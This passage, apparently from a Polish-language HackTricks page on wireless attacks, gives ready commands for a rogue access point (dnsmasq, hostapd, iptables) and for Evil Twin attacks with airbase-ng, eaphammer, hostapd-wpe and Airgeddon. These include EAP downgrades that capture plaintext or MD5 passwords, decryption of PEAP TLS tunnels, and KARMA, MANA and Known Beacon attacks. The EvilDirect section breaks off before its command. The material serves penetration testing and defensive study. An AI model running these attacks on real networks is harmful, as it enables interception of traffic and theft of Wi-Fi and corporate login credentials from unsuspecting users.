Używając `ifconfig -a` sprawdź, czy interfejs wlan do utworzenia AP oraz interfejs połączony z Internetem są obecne.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Utwórz plik konfiguracyjny `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Następnie **ustaw IPs** i **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
A następnie **uruchom** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Utwórz plik konfiguracyjny `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zatrzymaj irytujące procesy** , ustaw **monitor mode**, oraz **uruchom hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Przekazywanie i przekierowanie
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Atak evil twin wykorzystuje sposób, w jaki klienci WiFi rozpoznają sieci, polegając głównie na nazwie sieci (ESSID), bez wymogu, aby stacja bazowa (access point) uwierzytelniała się wobec klienta. Kluczowe punkty obejmują:

- **Trudność w rozróżnieniu**: Urządzenia mają problemy z odróżnieniem legalnych i rogue access points, gdy mają ten sam ESSID i typ szyfrowania. W rzeczywistych sieciach często używa się wielu access points z tym samym ESSID, aby płynnie rozszerzyć zasięg.
- **Client Roaming and Connection Manipulation**: Protokół 802.11 pozwala urządzeniom przemieszczać się między access points w ramach tego samego ESS. Atakujący mogą to wykorzystać, zwabiając urządzenie do rozłączenia się z jego obecną stacją bazową (access point) i połączenia z rogue access point. Można to osiągnąć, oferując silniejszy sygnał lub zakłócając połączenie z legalnym access pointem za pomocą metod takich jak deauthentication packets lub jamming.
- **Wyzwania przy wykonaniu**: Skuteczne przeprowadzenie evil twin attack w środowiskach z wieloma, dobrze rozmieszczonymi access points może być trudne. Deauthenticating pojedynczego legalnego access point często powoduje, że urządzenie łączy się z innym legalnym access pointem, chyba że atakujący potrafi deauthenticate wszystkie pobliskie access points lub strategicznie umieścić rogue access point.

Możesz stworzyć bardzo podstawowy Open Evil Twin (bez możliwości routowania ruchu do Internetu) wykonując:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Możesz również stworzyć Evil Twin używając **eaphammer** (zauważ, że aby tworzyć evil twins za pomocą eaphammer interfejs **nie powinien być** w trybie **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Lub używając Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Proszę, zauważ, że domyślnie jeśli ESSID w PNL jest zapisany jako chroniony WPA, urządzenie nie połączy się automatycznie z Open Evil Twin. Możesz spróbować DoS-ować prawdziwy AP i liczyć, że użytkownik ręcznie połączy się z twoim Open Evil Twin, albo możesz DoS-ować prawdziwy AP i użyć WPA Evil Twin, żeby przechwycić handshake (przy tej metodzie nie będziesz mógł pozwolić ofierze na połączenie się z tobą, bo nie znasz PSK, ale możesz przechwycić handshake i spróbować je złamać).

_Niektóre OS i AV ostrzegą użytkownika, że połączenie z otwartą siecią (Open) jest niebezpieczne..._

### WPA/WPA2 Evil Twin

Możesz stworzyć **Evil Twin używając WPA/2** i jeśli urządzenia są skonfigurowane, by łączyć się z tym SSID przy użyciu WPA/2, będą próbować się połączyć. Jednak, aby zakończyć **4-way-handshake**, musisz także **znać** **hasło**, którego klient użyje. Jeśli go **nie znasz**, **połączenie nie zostanie zakończone**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Aby zrozumieć ten atak, zalecam najpierw przeczytać krótki [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Korzystanie z hostapd-wpe**

`hostapd-wpe` potrzebuje pliku **konfiguracji**, aby działać. Aby **zautomatyzować** generowanie tych konfiguracji, możesz użyć [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (pobierz plik Pythona w katalogu _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
W pliku konfiguracyjnym możesz wybrać wiele różnych rzeczy, takich jak ssid, channel, user files, cret/key, dh parameters, wpa version i auth...

[**Użycie hostapd-wpe z EAP-TLS, aby umożliwić dowolnemu certyfikatowi zalogowanie się.**](evil-twin-eap-tls.md)

**Używanie EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Domyślnie EAPHammer stosuje następujące metody uwierzytelniania (zauważ, że GTC jest pierwszą, której celem jest uzyskanie plaintext passwords, a następnie są używane bardziej odporne auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
To jest domyślna metodologia, aby uniknąć długich czasów połączenia. Jednak możesz również określić dla server authentication methods kolejność od najsłabszych do najsilniejszych:
```
--negotiate weakest
```
Lub możesz również użyć:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (oferując te same auth methods w tej samej kolejności co organizacja, atak będzie znacznie trudniejszy do wykrycia).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` może użyć wcześniej wygenerowanych certyfikatów, aby zaoferować uwierzytelnianie EAP dla sieci WPA/WPA2-Enterprise. Fałszywa sieć obniży protokół połączenia do EAP-MD5, dzięki czemu będzie w stanie **przechwycić użytkownika oraz MD5 hasła**. Później atakujący może spróbować złamać hasło.\
`Airggedon` offers you the possibility of a **continuous Evil Twin attack (noisy)** or **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

W obrębie **konfiguracji** _hostapd-wpe_ **zakomentuj** linię, która zawiera _**dh_file**_ (z `dh_file=/etc/hostapd-wpe/certs/dh` na `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Spowoduje to, że `hostapd-wpe` będzie **wymieniać klucze przy użyciu RSA** zamiast DH, dzięki czemu będziesz mógł później **odszyfrować** ruch, **znając prywatny klucz serwera**.

Uruchom teraz **Evil Twin** używając **`hostapd-wpe`** z tą zmodyfikowaną konfiguracją jak zwykle. Uruchom również **`wireshark`** na **interfejsie**, który przeprowadza atak Evil Twin.

Teraz lub później (gdy już przechwyciłeś kilka prób uwierzytelnienia) możesz dodać prywatny klucz RSA do wireshark w: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodaj nowy wpis i wypełnij formularz tymi wartościami: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**wybierz swój plik klucza**, aby uniknąć problemów wybierz plik klucza **niechroniony hasłem**).

![](<../../images/image (687).png>)

I spójrz na nową **"Decrypted TLS" tab**:

![](<../../images/image (231).png>)

## Atak KARMA, MANA, Loud MANA i Known beacons

### Białe/czarne listy ESSID i MAC

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Rogue AP będzie odpowiadać tylko na probe requests od urządzeń wymienionych na whitelist, pozostając niewidocznym dla wszystkich innych, które nie są na liście.
2. **MAC-based Blacklist**:
- Rogue AP będzie ignorować probe requests od urządzeń znajdujących się na blacklist, efektywnie czyniąc rogue AP niewidocznym dla tych konkretnych urządzeń.
3. **SSID-based Whitelist**:
- Rogue AP będzie odpowiadać na probe requests tylko dla konkretnych ESSID wymienionych na liście, czyniąc go niewidocznym dla urządzeń, których Preferred Network Lists (PNLs) nie zawierają tych ESSID.
4. **SSID-based Blacklist**:
- Rogue AP nie będzie odpowiadać na probe requests dla konkretnych ESSID znajdujących się na blacklist, czyniąc go niewidocznym dla urządzeń poszukujących tych konkretnych sieci.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ta metoda pozwala **atakującemu utworzyć złośliwy access point (AP), który odpowiada na wszystkie probe requests** wysyłane przez urządzenia próbujące połączyć się z sieciami. Technika ta **oszukuje urządzenia, skłaniając je do połączenia z AP atakującego** poprzez naśladowanie sieci, których urządzenia poszukują. Gdy urządzenie wyśle żądanie połączenia do tego rogue AP, połączenie zostaje nawiązane, przez co urządzenie błędnie łączy się z siecią atakującego.

### MANA

Wtedy **urządzenia zaczęły ignorować niepewne odpowiedzi sieciowe**, co zmniejszyło skuteczność oryginalnego karma attack. Jednak pojawiła się nowa metoda znana jako **MANA attack**, wprowadzona przez Iana de Villiersa i Dominica White'a. Ta metoda polega na tym, że rogue AP **przechwytuje Preferred Network Lists (PNL) z urządzeń, odpowiadając na ich broadcast probe requests** nazwami sieci (SSIDs) wcześniej zapamiętanymi przez urządzenia. Ten zaawansowany atak omija zabezpieczenia przeciwko oryginalnemu karma attack, wykorzystując sposób, w jaki urządzenia pamiętają i priorytetyzują znane sieci.

MANA attack działa poprzez monitorowanie zarówno directed, jak i broadcast probe requests od urządzeń. Dla directed requests zapisuje MAC address urządzenia oraz żądaną nazwę sieci, dodając te informacje do listy. Gdy nadejdzie broadcast request, AP odpowiada informacją pasującą do którejkolwiek z sieci na liście urządzenia, skłaniając je do połączenia z rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** jest zaawansowaną strategią stosowaną, gdy urządzenia nie używają directed probing lub gdy ich Preferred Network Lists (PNL) są nieznane atakującemu. Opiera się na zasadzie, że **urządzenia w tej samej okolicy prawdopodobnie będą miały wspólne niektóre nazwy sieci w swoich PNLs**. Zamiast odpowiadać selektywnie, atak ten rozgłasza probe responses dla każdej nazwy sieci (ESSID) znalezionej w połączonych PNLs wszystkich obserwowanych urządzeń. Takie szerokie podejście zwiększa szansę, że urządzenie rozpozna znajomą sieć i spróbuje połączyć się z rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Gdy **Loud MANA attack** może nie wystarczyć, **Known Beacon attack** oferuje inne podejście. Ta metoda **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** pochodzących ze słownika. To symuluje obecność wielu sieci, mając na celu dopasowanie ESSID z PNL ofiary, co powoduje próbę połączenia z sfałszowanym AP. Atak można wzmocnić, łącząc go z opcją `--loud`, aby podjąć bardziej agresywną próbę złapania urządzeń.

Eaphammer zaimplementował ten atak jako MANA attack, gdzie wszystkie ESSIDs z listy są nadawane (możesz też połączyć to z `--loud`, aby stworzyć Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

The **Known Beacon Burst attack** involves **rapid-fire broadcasting of beacon frames for each ESSID listed in a file**. Tworzy to gęste środowisko fałszywych sieci, znacznie zwiększając prawdopodobieństwo, że urządzenia połączą się z rogue AP, zwłaszcza w połączeniu z MANA attack. Technika ta wykorzystuje szybkość i dużą liczbę sygnałów, by przytłoczyć mechanizmy wyboru sieci w urządzeniach.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** to protokół umożliwiający urządzeniom łączenie się bezpośrednio ze sobą przy użyciu Wi-Fi bez potrzeby tradycyjnego punktu dostępowego. Ta funkcja jest zintegrowana z różnymi urządzeniami Internet of Things (IoT), takimi jak drukarki i telewizory, ułatwiając bezpośrednią komunikację urządzenie–urządzenie. Charakterystyczną cechą Wi-Fi Direct jest to, że jedno urządzenie pełni rolę access point, znane jako group owner, do zarządzania połączeniem.

Bezpieczeństwo połączeń Wi-Fi Direct jest ustanawiane przez **Wi-Fi Protected Setup (WPS)**, które obsługuje kilka metod bezpiecznego parowania, w tym:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Metody te, szczególnie PIN entry, są podatne na te same luki co WPS w tradycyjnych sieciach Wi-Fi, co czyni je celem podobnych wektorów ataku.

### EvilDirect Hijacking

**EvilDirect Hijacking** to atak specyficzny dla Wi-Fi Direct. Odzwierciedla koncepcję ataku Evil Twin, ale celuje w połączenia Wi-Fi Direct. W tym scenariuszu atakujący podszywa się pod legalnego group owner, aby oszukać urządzenia i zmusić je do połączenia się ze złośliwym bytem. Metodę tę można przeprowadzić za pomocą narzędzi takich jak `airbase-ng`, określając kanał, ESSID i MAC address podszywanego urządzenia:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Rzuć okiem na [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login z facebook i imitacja WPA w captive portals)

{{#include ../../banners/hacktricks-training.md}}
